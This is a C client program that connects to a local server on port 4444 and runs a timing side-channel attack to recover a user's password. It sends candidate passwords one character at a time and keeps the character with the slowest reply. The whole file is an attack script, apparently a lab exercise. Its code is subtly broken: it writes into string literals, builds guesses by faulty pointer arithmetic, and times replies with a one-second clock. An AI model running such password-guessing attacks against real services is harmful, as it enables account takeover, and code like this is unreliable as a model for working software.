#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <time.h>

#define PORT 4444

// char characters[] = {
//     'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 
//     'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i',
//     'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm',
//     'Q', 'W', 'E', 'R', 'T', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 
//     'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i',
//     'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm',       
// }

char* discoverPassword(int clientSocket, char* username) {

    char* rightPassword = "";
    char* password_buffer = "!";
    char server_buffer[1024];

    char maxTimeChar;
    int maxTime = 0;
    char currChar = 33;
    time_t timeBefore, timeAfter;

    // Send the username to the server
    send(clientSocket, username, strlen(username), 0);
    if(strcmp(username, ":exit") == 0) {
        close(clientSocket);
        printf("[-]Disconnected from server.\n");
        exit(1);
    }

    // Perform the timing attack to discover the password
    while(1) {
        strcpy(password_buffer, (rightPassword+currChar));

        timeBefore = time(NULL);

        send(clientSocket, password_buffer, strlen(password_buffer), 0);

        if(recv(clientSocket, server_buffer, 1024, 0) < 0) {
            printf("[-]Error in receiving data.\n");
            exit(1);
        }

        timeAfter = time(NULL);

        if(strcmp(server_buffer, "Authenticated") == 0) {   // The right password found
            break;  
        }
        
        if((timeAfter-timeBefore) > maxTime) {
            maxTime = timeAfter-timeBefore;
            maxTimeChar = currChar;
        }

        // Move to the next char
        currChar++;
        if(currChar > 126) {
            currChar = 33;
            password_buffer[strlen(password_buffer)] = maxTimeChar;
            strcpy(rightPassword, password_buffer);
        }

        maxTime = 0;
        bzero(server_buffer, sizeof(server_buffer)); 
    }
    
    return rightPassword;
}

void chatWithServer(int clientSocket) {

    char username_buffer[1024];
    char* password;

    while(1) {
        printf("Username: ");
        scanf("%s", &username_buffer[0]);
        
        password = discoverPassword(clientSocket, username_buffer);
        printf("Success! The password is: %s", password);

        bzero(username_buffer, sizeof(username_buffer));
    }
}

int main() {

    int clientSocket, ret;
    struct sockaddr_in serverAddr;

    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if(clientSocket < 0) {
        printf("[-]Error in connection.\n");
        exit(1);
    }
    printf("[+]Client Socket is created\n");

    memset(&serverAddr, '\0', sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    ret = connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if(ret < 0) {
        printf("[-]Error in connection.\n");
        exit(1);
    }
    printf("[+]Connected to Server.\n");  

    chatWithServer(clientSocket);

    return 0;
}